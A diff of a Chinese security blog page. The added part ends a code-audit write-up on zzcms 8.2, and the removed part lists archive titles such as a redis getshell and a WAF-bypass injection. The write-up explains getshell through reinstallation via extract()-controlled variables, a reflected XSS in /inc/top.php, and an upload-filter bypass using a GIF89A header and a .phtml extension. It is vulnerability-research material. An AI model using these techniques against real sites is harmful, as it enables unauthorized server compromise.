+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(file_exists(&quot;install.lock&quot;))&#123;</span><br><span class="line">echo &quot;&lt;div style=&apos;padding:30px;&apos;&gt;安装向导已运行安装过，如需重安装，请删除 /install/install.lock 文件&lt;/div&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>也就是说，抓包改一下step=2可以绕过检测跳到安装界面</p>
+<p><img src="https://s2.ax1x.com/2019/09/24/ukzVN4.png" alt="image"></p>
+<p>接下来的如何getshell呢，下面有段代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$fp=<span class="string">"../inc/config.php"</span>;</span><br><span class="line">$f = fopen($fp,<span class="string">'r'</span>);</span><br><span class="line">$str = fread($f,filesize($fp));</span><br><span class="line">      fclose($f);</span><br><span class="line">      $str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br></pre></td></tr></table></figure>
+<p>$url是可写入的，因为上面有一段代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure></p>
+<p>可见这段extract函数把get,post传进来的值注册为变量</p>
+<p><img src="https://s2.ax1x.com/2019/09/24/uAukSP.png" alt="image"></p>
+<p><img src="https://s2.ax1x.com/2019/09/24/uAuwf1.png" alt="image"></p>
+<h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><h3 id="漏洞发生在-inc-top-php开始处"><a href="#漏洞发生在-inc-top-php开始处" class="headerlink" title="漏洞发生在/inc/top.php开始处"></a>漏洞发生在/inc/top.php开始处</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (@$_POST[&quot;action&quot;]==&quot;search&quot;)&#123;</span><br><span class="line">echo &quot;&lt;script&gt;location.href=&apos;&quot;.@$_POST[&quot;lb&quot;].&quot;/search.php?keyword=&quot;.@$_POST[&quot;keyword&quot;].&quot;&apos;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_REQUEST[&quot;skin&quot;]))&#123;</span><br><span class="line">$siteskin=$_REQUEST[&quot;skin&quot;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$siteskin=siteskin;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+<p>抓包构造xss<br><img src="https://s2.ax1x.com/2019/09/25/uEr3bF.png" alt="image"></p>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>在/uploadimg.php处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function upfile() &#123;</span><br><span class="line">if (!is_uploaded_file(@$this-&gt;fileName[tmp_name]))&#123;</span><br><span class="line">   echo &quot;&lt;script&gt;alert(&apos;请点击“浏览”，先选择您要上传的文件！\\n\\n支持的图片类型为：jpg,gif,png,bmp&apos;);parent.window.close();&lt;/script&gt;&quot;; exit;</span><br><span class="line">&#125;</span><br><span class="line">if ($this-&gt;max_file_size*1024 &lt; $this-&gt;fileName[&quot;size&quot;])&#123;</span><br><span class="line">   echo &quot;&lt;script&gt;alert(&apos;文件大小超过了限制！最大只能上传 &quot;.$this-&gt;max_file_size.&quot; K的文件&apos;);parent.window.close();&lt;/script&gt;&quot;;exit;</span><br><span class="line">&#125;</span><br><span class="line">if (!in_array($this-&gt;fileName[&quot;type&quot;], $this-&gt;uptypes)) &#123;</span><br><span class="line">   echo &quot;&lt;script&gt;alert(&apos;文件类型错误，支持的图片类型为：jpg,gif,png,bmp&apos;);parent.window.close();&lt;/script&gt;&quot;;exit;</span><br><span class="line">&#125;</span><br><span class="line">$hzm=strtolower(substr($this-&gt;fileName[&quot;name&quot;],strpos($this-&gt;fileName[&quot;name&quot;],&quot;.&quot;)));</span><br><span class="line">if (strpos($hzm,&quot;php&quot;)!==false || strpos($hzm,&quot;asp&quot;)!==false ||strpos($hzm,&quot;jsp&quot;)!==false)&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;&quot;.$hzm.&quot;，这种文件不允许上传&apos;);parent.window.close();&lt;/script&gt;&quot;;exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先是要求文件是post传上来的，然后检查文件大小，再是检查文件类型，这里在文件头加GIF89A，可骗过，最后是检查文件后缀，可以用phtml绕过，apache会将phtml文件按照php文件来解析</p>
+<p><img src="https://s2.ax1x.com/2019/10/09/u4wm5V.png" alt="image"></p>
+<p><img src="https://s2.ax1x.com/2019/10/09/u4wHI0.png" alt="image"></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/sql-hack1/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.711Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/sql-hack1/">记一次过waf注入</a>
-    </h1>
-  
+      
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/11/11/zzcms8.2/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/redis/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.702Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2019/11/11/bluecms/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          代码审计[day1]-bluecms
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/11/11/crlf/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">crlf &amp; soap</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/redis/">redis 未授权访问漏洞 getshell</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/maccms8x/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.687Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/maccms8x/">Maccms8.x命令执行漏洞</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/lun web/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.652Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/lun web/">CTF - 论剑场</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/xuliehua/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.591Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/xuliehua/">PHP反序列化由浅入深</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/ctf夺旗赛/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.562Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/ctf夺旗赛/">CTF夺旗赛</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/google hack/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.556Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/google hack/">Google Hack 语法</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/dedecms5.7/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.552Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/dedecms5.7/">dedecms最新版后台三处getshell</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/风筝writewp/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.531Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/风筝writewp/">2019上海嘉韦思杯线上赛writeup</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/2/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
   
 
 
@@ -438,8 +382,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
